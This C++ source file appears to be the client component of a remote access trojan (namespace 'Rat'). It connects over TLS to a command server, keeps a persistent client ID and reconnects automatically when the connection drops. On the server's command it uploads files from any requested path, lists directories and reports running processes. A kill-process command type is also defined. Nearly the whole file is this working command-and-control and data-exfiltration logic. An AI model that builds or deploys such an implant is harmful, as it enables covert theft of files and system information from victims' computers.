#include "Client.hpp"
#include <iostream>
#include <thread>
#include <random>
#include <fstream>
#include "FileSender.hpp"
#include "ProcessUtils.hpp"
#include "FileFolderUtils.hpp"
#include "Utils.hpp"
namespace Rat 
{

    std::string generateRandomData(size_t length) 
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(33, 126);
        std::string data;
        for (size_t i = 0; i < length; ++i) 
        {
            data += static_cast<char>(dis(gen));
        }
        return data;
    }

    Client::Client(const std::string& host, uint16_t port)
        : host_(host),
        port_(port),
        stopping_(false),
        networkManager_(),
        timer_(networkManager_.get_io_context())
    {
        networkManager_.setup_ssl_context_client("ca.crt", host_);
        // networkManager_.setup_ssl_context(false, "client.crt", "client.key", "ca.crt");
    }

    Client::~Client() 
    {
        stop();
    }

    void Client::start() 
    {
        initClientID();
        tryConnect();
        input_thread_ = std::thread(&Client::handleUserInput, this);
        networkManager_.get_io_context().run();
    }

    void Client::stop() 
    {
        stopping_ = true;
        networkManager_.get_io_context().stop();
        if (socket_) socket_->lowest_layer().close();
        if (input_thread_.joinable()) input_thread_.join();
    }

    void Client::initClientID(const std::string& path) 
    {
        std::fstream file(path, std::ios::in | std::ios::out | std::ios::app);
        if (!file.is_open()) 
        {
            std::cout << "Cannot open file: " << path << "\n";
            return;
        }
        std::string client_id;
        std::getline(file, client_id);
        try 
        {
            this_id_ = std::stol(client_id);
        } 
        catch (const std::exception& e) 
        {
            // std::cout << "Invalid ID: " << e.what() << "\n";
        }
        file.close();
    }

    void Client::tryConnect() 
    {
        if (stopping_) return;
        if (socket_) 
        {
            socket_->lowest_layer().close();
            socket_.reset();
            // std::cout << "Debug: Closed previous socket\n";
        }
        socket_ = std::make_shared<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>>(
            networkManager_.get_io_context(), networkManager_.get_ssl_context());
        boost::asio::ip::tcp::resolver resolver(networkManager_.get_io_context());
        auto endpoints = resolver.resolve(host_, std::to_string(port_));

        boost::asio::async_connect(socket_->lowest_layer(), endpoints,
            [this](const boost::system::error_code& ec, boost::asio::ip::tcp::endpoint) 
            {
                if (!ec) 
                {
                    // socket_->set_verify_mode(boost::asio::ssl::verify_peer);
                    socket_->async_handshake(boost::asio::ssl::stream_base::client,
                        [this](const boost::system::error_code& ec) 
                        {
                            if (!ec) 
                            {
                                std::cout << "Connected to server: " << host_ << ":" << port_ << "\n";
                                sendClientId();
                                handleCommands();
                            } 
                            else 
                            {
                                std::cout << "Handshake error: " << ec.message() << "\n";
                                scheduleReconnect();
                            }
                        });
                } 
                else 
                {
                    std::cout << "Connection error: " << ec.message() << "\n";
                    scheduleReconnect();
                }
            });
    }

    void Client::sendClientId() 
    {
        if (this_id_ == uint64_t(-1)) 
        {
            rat::Packet packet;
            packet.set_type(rat::Packet::STATIC_ID);
            packet.set_packet_id("client_-1_" + std::to_string(std::rand()));
            packet.set_source_id("client_-1");
            packet.set_destination_id("server_0");
            packet.set_encrypted(true);
            auto* chunked = packet.mutable_chunked_data();
            chunked->set_data_id("STATIC_ID_" + Utils::getCurrentTimeString() + std::to_string(std::rand()));
            chunked->set_sequence_number(0);
            chunked->set_total_chunks(1);
            chunked->set_payload("-1");
            chunked->set_success(true);
            networkManager_.send(socket_, packet, [](const boost::system::error_code& ec) 
            {
                if (ec) std::cout << "Send error: " << ec.message() << "\n";
            });
        } 
        else 
        {
            rat::Packet packet;
            packet.set_type(rat::Packet::STATIC_ID);
            packet.set_packet_id("client_" + std::to_string(this_id_) + "_" + std::to_string(std::rand()));
            packet.set_source_id("client_" + std::to_string(this_id_));
            packet.set_destination_id("server_0");
            packet.set_encrypted(true);
            auto* chunked = packet.mutable_chunked_data();
            chunked->set_data_id("STATIC_ID_" + Utils::getCurrentTimeString() + std::to_string(std::rand()));
            chunked->set_sequence_number(0);
            chunked->set_total_chunks(1);
            chunked->set_payload(std::to_string(this_id_));
            chunked->set_success(true);
            networkManager_.send(socket_, packet, [](const boost::system::error_code& ec) 
            {
                if (ec) std::cout << "Send error: " << ec.message() << "\n";
            });
        }
    }

    void Client::scheduleReconnect() 
    {
        if (stopping_) return;
        if (socket_) 
        {
            socket_->lowest_layer().close();
            socket_.reset();
            // std::cout << "Debug: Closed socket for reconnect\n";
        }
        timer_.expires_from_now(boost::posix_time::seconds(5));
        timer_.async_wait([this](const boost::system::error_code& ec) 
        {
            if (!ec && !stopping_) 
            {
                std::cout << "Retrying connection to server...\n";
                tryConnect();
            }
        });
    }

    void Client::handleCommands() 
    {
        if (stopping_) return;
        networkManager_.receive(socket_,
            [this](const rat::Packet& packet, const boost::system::error_code& ec) 
            {
                if (ec) 
                {   
                    if (ec == boost::asio::error::eof || ec == boost::asio::error::connection_reset || ec.value() == 1) 
                    {
                        std::cout << "[" << std::time(nullptr) << "] Connection lost, cleaning up and scheduling reconnect...\n";
                        if (current_file_sender_) 
                        {
                            current_file_sender_.reset(); 
                        }
                        if (current_process_sender_)
                        {
                            current_process_sender_.reset();
                        }
                        if (current_file_folder_sender_)
                        {
                            current_file_folder_sender_.reset();
                        }
                        if (socket_) 
                        {
                            socket_->lowest_layer().close();
                            socket_.reset(); 
                        }
                        scheduleReconnect();
                        return;
                    } 
                    else 
                    {
                        std::cout << "[" << std::time(nullptr) << "] Receive error: " << ec.message() << "\n";
                        if (socket_) 
                        {
                            socket_->lowest_layer().close();
                            socket_.reset(); 
                        }
                        scheduleReconnect();
                        return;
                    }
                }
                if (packet.has_chunked_data()) 
                {
                    // std::cout << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
                    //         std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
                    switch (packet.type())
                    {
                        case rat::Packet::STATIC_ID:
                        {
                            try 
                            {
                                this_id_ = std::stol(packet.chunked_data().payload());
                                std::ofstream file("client_id.txt");
                                if (file.is_open()) 
                                {
                                    file << this_id_ << "\n";
                                    file.close();
                                }
                            } 
                            catch (const std::exception& e) 
                            {
                                // std::cout << "Invalid ID: " << e.what() << "\n";
                            }
                            boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                            break;
                        }
                        case rat::Packet::TRANSFER_FILE:
                        {
                            std::cout << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
                            std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
                            std::cout << "COMMAND FILE PATH FROM SERVER: " << packet.file_path() << std::endl;
                            current_file_sender_ = std::make_shared<FileSender>(socket_, networkManager_, this_id_, packet.file_path());
                            current_file_sender_->sendFile(
                                packet.file_path(),
                                Utils::getCurrentTimeString() + std::to_string(this_id_),
                                [this]() {
                                    std::cout << "File transfer completed.\n";
                                    handleCommands();
                                    // boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                                },
                                [this]() {
                                    std::cout << "Connection lost during file transfer, scheduling reconnect...\n";
                                   if (current_file_sender_) 
                                    {
                                        current_file_sender_.reset();
                                    }
                                    if (socket_) 
                                    {
                                        socket_->lowest_layer().close();
                                        socket_.reset();
                                    }
                                    scheduleReconnect();
                                }
                            );
                            return;
                            break;
                        }
                        case rat::Packet::LIST_FILES_FOLDERS:
                        {    
                            std::cout << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
                            std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
                            // note check if path/level = packet.chunked_data().payload() not ok before listFilesFolders 
                            std::string file_folder_data = FileFolderUtils::listFilesFolders(packet.chunked_data().payload()); 
                            std::cout << "Debug size of file/folder list: " << file_folder_data.size() << std::endl;

                            current_file_folder_sender_ = std::make_shared<FileFolderSender>(socket_, networkManager_, this_id_, file_folder_data);
                            current_file_folder_sender_->sendFileFolders(
                                "LIST_FILES_FOLDERS_" + Utils::getCurrentTimeString() + std::to_string(this_id_),
                                [this]()
                                {
                                    std::cout << "File/folder list transfer completed.\n";
                                    handleCommands();
                                },
                                [this]()
                                {
                                    std::cout << "Connection lost during file/folder transfer, scheduling reconnect...\n";
                                    if (current_file_folder_sender_)
                                    {
                                        current_file_folder_sender_.reset();
                                    }
                                    if (socket_)
                                    {
                                        socket_->lowest_layer().close();
                                        socket_.reset();
                                    }
                                    scheduleReconnect();
                                }
                            );
                            break;
                        }
                        case rat::Packet::LIST_PROCESSES:
                        {  
                            std::cout << "COMMAND TYPE FROM SERVER: " << packet.type() << std::endl;
                            std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;

                            // Get process list
                            std::string process_data = formatProcessList(listProcesses());
                            std::cout << "Debug size: " << process_data << std::endl;
                            current_process_sender_ = std::make_shared<ProcessSender>(socket_, networkManager_, this_id_, process_data);
                            current_process_sender_->sendProcesses(
                                "LIST_PROCESS_" + Utils::getCurrentTimeString() + std::to_string(this_id_),
                                [this]()
                                {
                                    std::cout << "Process list transfer completed.\n";
                                    handleCommands();
                                },
                                [this]()
                                {
                                    std::cout << "Connection lost during process transfer, scheduling reconnect...\n";
                                    if (current_process_sender_)
                                    {
                                        current_process_sender_.reset();
                                    }
                                    if (socket_)
                                    {
                                        socket_->lowest_layer().close();
                                        socket_.reset();
                                    }
                                    scheduleReconnect();
                                }
                            );
                            return;
                        }
                        default:
                        {

                            boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                            break;
                        }
                    }
                    
                }
            });
    }
    // debug 2-way communication between server and client
    void Client::handleUserInput() 
    {
        std::string input;
        while (!stopping_ && std::getline(std::cin, input)) 
        {
            rat::Packet packet;
            packet.set_packet_id("client_" + std::to_string(std::rand()));
            packet.set_source_id("client_" + std::to_string(this_id_));
            packet.set_destination_id("server_0");
            auto* chunked = packet.mutable_chunked_data();
            chunked->set_payload(input);

            if (input == "list_files_folders") 
            {
                packet.set_type(rat::Packet::LIST_FILES_FOLDERS);
            } 
            else if (input == "list_processes") 
            {
                packet.set_type(rat::Packet::LIST_PROCESSES);
            } 
            else if (input == "read_file") 
            {
                packet.set_type(rat::Packet::READ_FILE);
            } 
            else if (input == "kill_process") 
            {
                packet.set_type(rat::Packet::KILL_PROCESS);
            } 
            else 
            {
                continue;
            }

            networkManager_.send(socket_, packet, [](const boost::system::error_code& ec) 
            {
                if (ec) std::cout << "Send error: " << ec.message() << "\n";
            });
        }
    }

} // namespace Rat